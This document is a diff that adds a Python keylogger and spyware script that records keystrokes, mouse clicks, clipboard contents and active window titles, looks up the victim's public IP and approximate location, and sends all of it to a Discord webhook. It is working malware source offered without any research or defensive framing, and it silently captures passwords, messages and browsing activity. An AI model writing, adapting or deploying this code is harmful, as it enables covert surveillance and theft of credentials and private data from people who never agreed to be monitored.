@@ -1,0 +1,147 @@
+from pynput import mouse, keyboard
+import requests
+import json
+import threading
+import time
+import pyperclip
+import pygetwindow as gw
+from discord import Embed
+import warnings
+from urllib3.exceptions import InsecureRequestWarning
+
+WEBHOOK_URL = ''
+
+
+warnings.simplefilter('ignore', InsecureRequestWarning)
+
+
+HARDWARE_ID = "1234-5678-90AB-CDEF"
+
+def get_public_ip():
+    try:
+        response = requests.get('https://api.ipify.org?format=json')
+        ip_data = response.json()
+        return ip_data['ip']
+    except Exception as e:
+        print(f"Error retrieving IP address: {e}")
+        return "Unknown IP"
+
+def get_location_coordinates(ip):
+    try:
+        response = requests.get(f'http://ip-api.com/json/{ip}')
+        location_data = response.json()
+        if location_data['status'] == 'success':
+            return f"{location_data['lat']}, {location_data['lon']}"
+        else:
+            return "Unknown Location"
+    except Exception as e:
+        print(f"Error retrieving location coordinates: {e}")
+        return "Unknown Location"
+
+def transmit_to_discord(message, retries=3):
+    for attempt in range(retries):
+        try:
+            data = {
+                "embeds": [message.to_dict()]
+            }
+            response = requests.post(WEBHOOK_URL, data=json.dumps(data), headers={"Content-Type": "application/json"})
+            if response.status_code != 204:
+                print(f"Transmission failed: {response.status_code} - {response.text}")
+            else:
+                return
+        except requests.exceptions.ConnectionError as e:
+            print(f"Connection error: {e}. Retrying ({attempt + 1}/{retries})...")
+            time.sleep(1)
+        except Exception as e:
+            print(f"Unexpected error: {e}")
+            break
+
+
+transcribed_message = ""
+
+
+def on_press(key):
+    global transcribed_message
+    try:
+        if key == keyboard.Key.enter:
+            if "http://" in transcribed_message or "https://" in transcribed_message or "www." in transcribed_message:
+                embed = Embed(title="Website Transcribed", description=transcribed_message, color=0x000000)
+                embed.set_footer(text=f"Hardware ID: {HARDWARE_ID} | IP Address: {get_public_ip()} | Location: {get_location_coordinates(get_public_ip())}")
+                transmit_to_discord(embed)
+            else:
+                embed = Embed(title="Transcribed Message", description=transcribed_message, color=0x000000)
+                embed.set_footer(text=f"Hardware ID: {HARDWARE_ID} | IP Address: {get_public_ip()} | Location: {get_location_coordinates(get_public_ip())}")
+                transmit_to_discord(embed)
+            transcribed_message = ""  
+        else:
+            transcribed_message += key.char
+    except AttributeError:
+        pass 
+
+
+def clipboard_monitor():
+    previous_clipboard_content = ""
+    while True:
+        current_clipboard_content = pyperclip.paste()
+        if current_clipboard_content != previous_clipboard_content:
+            embed = Embed(title="Clipboard Alteration Detected", description=current_clipboard_content, color=0x000000)
+            embed.set_footer(text=f"Hardware ID: {HARDWARE_ID} | IP Address: {get_public_ip()} | Location: {get_location_coordinates(get_public_ip())}")
+            transmit_to_discord(embed)
+            previous_clipboard_content = current_clipboard_content
+        time.sleep(1)
+
+
+def window_monitor():
+    previous_active_window = None
+    while True:
+        active_window = gw.getActiveWindow()
+        if active_window and active_window.title != previous_active_window:
+            if "http://" in active_window.title or "https://" in active_window.title:
+                website_url = active_window.title
+                website_name = website_url.replace("http://", "").replace("https://", "").replace("www.", "").split("/")[0]
+                embed = Embed(title="Website Access Initiated", description=f"[Website Link]({website_url})", color=0x000000)
+                embed.add_field(name="Website Name", value=website_name, inline=False)
+            else:
+                embed = Embed(title="Window Interaction Registered", description=f"Window opened/clicked: {active_window.title}", color=0x000000)
+            embed.set_footer(text=f"Hardware ID: {HARDWARE_ID} | IP Address: {get_public_ip()} | Location: {get_location_coordinates(get_public_ip())}")
+            transmit_to_discord(embed)
+            previous_active_window = active_window.title
+        time.sleep(1)
+
+
+def on_click(x, y, button, pressed):
+    if pressed:
+        active_window = gw.getActiveWindow()
+        if active_window:
+            embed = Embed(title="Mouse Interaction Detected", description=f"Clicked on: {active_window.title} at ({x}, {y}) with {button}", color=0x000000)
+            embed.set_footer(text=f"Hardware ID: {HARDWARE_ID} | IP Address: {get_public_ip()} | Location: {get_location_coordinates(get_public_ip())}")
+            transmit_to_discord(embed)
+
+
+def on_close(window):
+    embed = Embed(title="Window Termination Noted", description=f"Window closed: {window.title}", color=0x000000)
+    embed.set_footer(text=f"Hardware ID: {HARDWARE_ID} | IP Address: {get_public_ip()} | Location: {get_location_coordinates(get_public_ip())}")
+    transmit_to_discord(embed)
+
+
+keyboard_listener = keyboard.Listener(on_press=on_press)
+keyboard_listener.start()
+
+
+mouse_listener = mouse.Listener(on_click=on_click)
+mouse_listener.start()
+
+
+clipboard_thread = threading.Thread(target=clipboard_monitor)
+clipboard_thread.start()
+
+
+window_thread = threading.Thread(target=window_monitor)
+window_thread.start()
+
+
+try:
+    while True:
+        time.sleep(1)
+except KeyboardInterrupt:
+    print("Terminating...")
